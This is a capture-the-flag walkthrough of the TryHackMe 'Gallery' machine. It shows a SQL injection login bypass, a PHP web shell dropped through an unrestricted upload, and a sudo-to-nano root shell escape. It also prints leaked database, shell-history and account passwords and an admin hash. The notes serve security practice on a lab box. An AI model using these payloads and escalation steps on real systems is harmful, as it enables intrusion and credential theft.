# Notes - Tryhackme Gallery


## http://10.10.234.15/gallery/login.php

```bash
admin' or '1'='1'# - Bypasses login.
```
## Reverse shell steps

Bypass login with SQLi
Go to Albums -> Album 104
Click Upload
The upload form is unrestricted, I simply uploaded a php one liner.
Right click on script uploaded and copy image link.
Execute commands at will :DDD

## Initialize.php

```bash
<?php
$dev_data = array('id'=>'-1','firstname'=>'Developer','lastname'=>'','username'=>'dev_oretnom','password'=>'5da283a2d990e8d8512cf967df5bc0d0','last_login'=>'','date_updated'=>'','date_added'=>'');

if(!defined('base_url')) define('base_url',"http://" . $_SERVER['SERVER_ADDR'] . "/gallery/");
if(!defined('base_app')) define('base_app', str_replace('\\','/',__DIR__).'/' );
if(!defined('dev_data')) define('dev_data',$dev_data);
if(!defined('DB_SERVER')) define('DB_SERVER',"localhost");
if(!defined('DB_USERNAME')) define('DB_USERNAME',"gallery_user");
if(!defined('DB_PASSWORD')) define('DB_PASSWORD',"passw0rd321");
if(!defined('DB_NAME')) define('DB_NAME',"gallery_db");
```

## /etc/passwd

```bash
root:x:0:0:root:/root:/bin/bash
ubuntu:x:1000:1000:ubuntu:/home/ubuntu:/bin/bash
mike:x:1001:1001:mike:/home/mike:/bin/bash
```


```bash
╔══════════╣ Searching passwords in history files
      @stats   = stats                                                                                                                                                 
      @items   = { _seq_: 1  }
      @threads = { _seq_: "A" }
sudo -lb3stpassw0rdbr0xx
sudo -l
```
## /home/mike/documents/accounts.txt

```bash
Spotify : mike@gmail.com:mycat666
Netflix : mike@gmail.com:123456789pass
TryHackme: mike:darkhacker123
```
## sudo -l

```bash
mike@gallery:/dev/shm$ sudo -l
Matching Defaults entries for mike on gallery:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User mike may run the following commands on gallery:
    (root) NOPASSWD: /bin/bash /opt/rootkit.sh
```
## /opt/rootkit.sh

```bash
#!/bin/bash

read -e -p "Would you like to versioncheck, update, list or read the report ? " ans;

# Execute your choice
case $ans in
    versioncheck)
        /usr/bin/rkhunter --versioncheck ;;
    update)
        /usr/bin/rkhunter --update;;
    list)
        /usr/bin/rkhunter --list;;
    read)
        /bin/nano /root/report.txt;;
    *)
        exit;;
esac
```
# Privilege Escalation

https://gtfobins.github.io/gtfobins/nano/ - Under 'Sudo'

sudo /bin/bash /opt/rootkit.sh

Type 'read'

When Nano opens up use CTRL+R and then CTRL+X

Paste "reset; sh 1>&0 2>&0" and hit enter.

A root shell has now spawned. GG


# NOTE - Interact with the DB

```bash
MariaDB [gallery_db]> select * from users;
+----+--------------+----------+----------+----------------------------------+------------------------------------------+------------+------+---------------------+---------------------+
| id | firstname    | lastname | username | password                         | avatar                                   | last_login | type | date_added          | date_updated        |
+----+--------------+----------+----------+----------------------------------+------------------------------------------+------------+------+---------------------+---------------------+
|  1 | Adminstrator | Admin    | admin    | a228b12a08b6527e7978cbe5d914531c | uploads/1629883080_1624240500_avatar.png | NULL       |    1 | 2021-01-20 14:02:37 | 2021-08-25 09:18:12 |
+----+--------------+----------+----------+----------------------------------+------------------------------------------+------------+------+---------------------+---------------------+
1 row in set (0.00 sec)
```
The machine is already rooted at this point but you have to interact with the DB to get the admin password hash for question 3.
